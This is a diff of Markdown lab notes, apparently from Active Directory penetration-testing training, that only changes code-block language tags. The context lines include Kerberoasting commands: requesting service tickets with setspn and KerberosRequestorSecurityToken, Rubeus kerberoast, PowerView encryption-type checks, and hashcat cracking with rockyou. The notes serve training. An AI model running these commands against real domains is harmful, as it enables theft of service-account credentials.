@@ -28,7 +28,7 @@ PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken
 <mark style="color:green;">**Retrieving All Tickets Using setspn.exe**</mark>
 
 {% code overflow="wrap" fullWidth="true" %}
-```powershell-session
+```powershell
 PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
 ```
 {% endcode %}
@@ -199,7 +199,7 @@ Kerberoasting tools typically request **`RC4 encryption`** when performing the a
 Let's start by creating an SPN account named `testspn` and using Rubeus to Kerberoast this specific user to test this out. As we can see, we received the TGS ticket RC4 (type 23) encrypted.
 
 {% code fullWidth="true" %}
-```powershell-session
+```powershell
 PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap
 ```
 {% endcode %}
@@ -207,7 +207,7 @@ PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap
 Checking with PowerView, we can see that the `msDS-SupportedEncryptionTypes` attribute is set to `0`. The chart [here](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797) tells us that a decimal value of `0` means that a specific encryption type is not defined and set to the default of `RC4_HMAC_MD5`.
 
 {% code overflow="wrap" fullWidth="true" %}
-```powershell-session
+```powershell
 PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
 
 serviceprincipalname                   msds-supportedencryptiontypes samaccountname
@@ -221,7 +221,7 @@ Next, let's crack this ticket using Hashcat and note how long it took. The accou
 <mark style="color:green;">**Cracking the Ticket with Hashcat & rockyou.txt**</mark>
 
 {% code fullWidth="true" %}
-```shell-session
+```powershell
 mrroboteLiot@htb[/htb]$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
 ```
 {% endcode %}
@@ -235,7 +235,7 @@ If we check this with PowerView, we'll see that the `msDS-SupportedEncryptionTyp
 <mark style="color:green;">**Checking Supported Encryption Types**</mark>
 
 {% code overflow="wrap" fullWidth="true" %}
-```powershell-session
+```powershell
 PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
 
 serviceprincipalname                   msds-supportedencryptiontypes samaccountname
